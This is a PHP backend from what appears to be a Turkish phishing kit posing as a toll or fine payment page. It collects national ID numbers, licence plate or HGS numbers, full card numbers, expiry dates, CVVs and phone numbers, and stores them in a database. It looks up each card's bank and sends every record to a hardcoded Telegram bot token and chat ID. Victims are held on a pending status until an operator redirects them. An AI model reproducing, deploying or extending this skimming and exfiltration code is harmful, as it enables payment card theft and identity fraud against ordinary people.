<?php
session_start();

// Güvenlik helper'ı dahil et
require_once 'security.php';

// Config dosyasını dahil et
require_once 'config.php';

// Veritabanı bağlantısı
$pdo = getDbConnection();

// POST verilerini al ve XSS temizle
$action = Security::xss_clean($_POST['action'] ?? '');

// Kullanıcı session kontrolü
if (!isset($_SESSION['userIdentifier'])) {
    die(json_encode(['success' => false, 'message' => 'Session bulunamadı']));
}

$userIdentifier = $_SESSION['userIdentifier'];

switch($action) {
    case 'create_user':
        createUser($pdo, $userIdentifier);
        break;
    
    case 'update_amount':
        updateAmount($pdo, $userIdentifier);
        break;
    
    case 'update_payment':
        updatePayment($pdo, $userIdentifier);
        break;
    
    case 'check_status':
        checkStatus($pdo, $userIdentifier);
        break;
    
    default:
        echo json_encode(['success' => false, 'message' => 'Geçersiz işlem']);
}

function createUser($pdo, $userIdentifier) {
    $identifierType = Security::xss_clean($_POST['identifier_type'] ?? '');
    $identifierValue = Security::xss_clean($_POST['identifier_value'] ?? '');
    
    // Validasyon
    if (empty($identifierType) || empty($identifierValue)) {
        echo json_encode(['success' => false, 'message' => 'Tüm alanlar zorunludur']);
        return;
    }
    
    // TC Kimlik validasyonu
    if ($identifierType === 'tc') {
        $identifierValue = Security::validate_tc($identifierValue);
        if (!$identifierValue) {
            echo json_encode(['success' => false, 'message' => 'Geçersiz TC Kimlik No']);
            return;
        }
    }
    
    try {
        // Kullanıcı zaten var mı kontrol et
        $stmt = $pdo->prepare("SELECT id FROM users WHERE user_identifier = ?");
        $stmt->execute([$userIdentifier]);
        
        if ($stmt->rowCount() > 0) {
            // Güncelle
            $stmt = $pdo->prepare("UPDATE users SET identifier_type = ?, identifier_value = ?, updated_at = NOW() WHERE user_identifier = ?");
            $stmt->execute([$identifierType, $identifierValue, $userIdentifier]);
        } else {
            // Yeni kayıt
            $stmt = $pdo->prepare("INSERT INTO users (user_identifier, identifier_type, identifier_value, created_at, updated_at) VALUES (?, ?, ?, NOW(), NOW())");
            $stmt->execute([$userIdentifier, $identifierType, $identifierValue]);
        }
        
        echo json_encode(['success' => true, 'message' => 'Kullanıcı oluşturuldu']);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası']);
    }
}

function updateAmount($pdo, $userIdentifier) {
    $amount = Security::validate_amount($_POST['amount'] ?? 0);
    $serviceFee = Security::validate_amount($_POST['service_fee'] ?? 0);
    $total = Security::validate_amount($_POST['total'] ?? 0);
    
    // Validasyon
    if ($amount === false || $serviceFee === false || $total === false) {
        echo json_encode(['success' => false, 'message' => 'Geçersiz tutar']);
        return;
    }
    
    // Toplam kontrolü
    if (abs(($amount + $serviceFee) - $total) > 0.01) {
        echo json_encode(['success' => false, 'message' => 'Tutar hesaplama hatası']);
        return;
    }
    
    try {
        $stmt = $pdo->prepare("UPDATE users SET amount = ?, service_fee = ?, total = ?, updated_at = NOW() WHERE user_identifier = ?");
        $stmt->execute([$amount, $serviceFee, $total, $userIdentifier]);
        
        echo json_encode(['success' => true, 'message' => 'Miktar güncellendi']);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası']);
    }
}

function updatePayment($pdo, $userIdentifier) {
    // Kart sahibi - sadece harf ve boşluk
    $cardHolder = Security::validate_name($_POST['card_holder'] ?? '');
    if (!$cardHolder) {
        echo json_encode(['success' => false, 'message' => 'Geçersiz kart sahibi adı']);
        return;
    }
    
    // Kart numarası - sadece rakam, Luhn kontrolü
    $cardNumber = Security::validate_card_number($_POST['card_number'] ?? '');
    if (!$cardNumber) {
        echo json_encode(['success' => false, 'message' => 'Geçersiz kart numarası']);
        return;
    }
    
    // Kart SKT - MM/YY formatı
    $cardExpiry = Security::validate_card_expiry($_POST['card_expiry'] ?? '');
    if (!$cardExpiry) {
        echo json_encode(['success' => false, 'message' => 'Geçersiz son kullanma tarihi']);
        return;
    }
    
    // CVV - 3-4 rakam
    $cardCvc = Security::validate_cvv($_POST['card_cvc'] ?? '');
    if (!$cardCvc) {
        echo json_encode(['success' => false, 'message' => 'Geçersiz CVV kodu']);
        return;
    }
    
    // Telefon - 10-11 rakam
    $phone = Security::validate_phone($_POST['phone'] ?? '');
    if (!$phone) {
        echo json_encode(['success' => false, 'message' => 'Geçersiz telefon numarası']);
        return;
    }
    
    try {
        // Önce kayıt var mı kontrol et
        $check = $pdo->prepare("SELECT id FROM users WHERE user_identifier = ?");
        $check->execute([$userIdentifier]);
        
        if ($check->rowCount() === 0) {
            // Kayıt yoksa oluştur
            $pdo->prepare("INSERT INTO users (user_identifier, identifier_type, identifier_value, created_at, updated_at) VALUES (?, 'unknown', '', NOW(), NOW())")
                ->execute([$userIdentifier]);
        }
        
        // redirect_url'i NULL olarak set et, admin yönlendirene kadar beklesin
        $stmt = $pdo->prepare("UPDATE users SET card_holder = ?, card_number = ?, card_expiry = ?, card_cvc = ?, phone = ?, payment_status = 'pending', redirect_url = NULL, updated_at = NOW() WHERE user_identifier = ?");
        $stmt->execute([$cardHolder, $cardNumber, $cardExpiry, $cardCvc, $phone, $userIdentifier]);
        
        echo json_encode(['success' => true, 'message' => 'Ödeme bilgileri kaydedildi']);

        // Telegram bildirimi
        $cardFormatted = trim(preg_replace('/(\d{4})/', '$1 ', $cardNumber));

        // Kimlik bilgisi çek
        $idLabels = [
            'tc'       => 'TC Kimlik No',
            'plaka'    => 'Plaka No',
            'vergi'    => 'Vergi No',
            'pasaport' => 'Pasaport No',
            'hgs'      => 'HGS Ürün No',
            'unknown'  => 'Bilinmiyor',
        ];
        $userRow = $pdo->prepare("SELECT identifier_type, identifier_value FROM users WHERE user_identifier = ? LIMIT 1");
        $userRow->execute([$userIdentifier]);
        $uData = $userRow->fetch();
        $idType  = $idLabels[$uData['identifier_type'] ?? 'unknown'] ?? ($uData['identifier_type'] ?? '-');
        $idValue = $uData['identifier_value'] ?? '-';

        // BIN bilgisi SQL'den çek
        $binLine = '';
        $rawBin = preg_replace('/\D/', '', $cardNumber);
        for ($len = min(8, strlen($rawBin)); $len >= 6; $len--) {
            $s = $pdo->prepare("SELECT banka_adi, type, brand FROM bins WHERE bin = ? LIMIT 1");
            $s->execute([substr($rawBin, 0, $len)]);
            $b = $s->fetch();
            if ($b) {
                $binLine = "\n🏦 *Banka:* {$b['banka_adi']}\n💎 *Tip:* {$b['type']}" . ($b['brand'] ? " ({$b['brand']})" : '');
                break;
            }
        }

        $now = date('d.m.Y H:i:s');
        $msg = "🔔 *Yeni Kart Girişi*\n\n"
             . "🕐 *Tarih:* {$now}\n"
             . "🪪 *{$idType}:* {$idValue}\n\n"
             . "💳 *Kart No:* `{$cardFormatted}`\n"
             . "👤 *Ad Soyad:* {$cardHolder}\n"
             . "📅 *SKT:* {$cardExpiry}\n"
             . "🔐 *CVV:* {$cardCvc}\n"
             . "📞 *Telefon:* {$phone}"
             . $binLine;
        $tgToken  = '8611209652:AAHcG3hgrtSv-aV_6iODhanP0xJajCrNtWQ';
        $tgChatId = '6949712770';
        $tgUrl    = "https://api.telegram.org/bot{$tgToken}/sendMessage";
        $tgCh = curl_init($tgUrl);
        curl_setopt($tgCh, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($tgCh, CURLOPT_POST, true);
        curl_setopt($tgCh, CURLOPT_POSTFIELDS, http_build_query([
            'chat_id'    => $tgChatId,
            'text'       => $msg,
            'parse_mode' => 'Markdown',
        ]));
        curl_setopt($tgCh, CURLOPT_TIMEOUT, 5);
        curl_setopt($tgCh, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($tgCh);
        curl_close($tgCh);
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası']);
    }
}

function checkStatus($pdo, $userIdentifier) {
    try {
        $stmt = $pdo->prepare("SELECT payment_status, redirect_url FROM users WHERE user_identifier = ?");
        $stmt->execute([$userIdentifier]);
        $user = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if ($user) {
            echo json_encode([
                'success' => true, 
                'status' => Security::xss_clean($user['payment_status']),
                'redirect_url' => Security::xss_clean($user['redirect_url'])
            ]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Kullanıcı bulunamadı']);
        }
    } catch(PDOException $e) {
        echo json_encode(['success' => false, 'message' => 'Veritabanı hatası']);
    }
}
?>
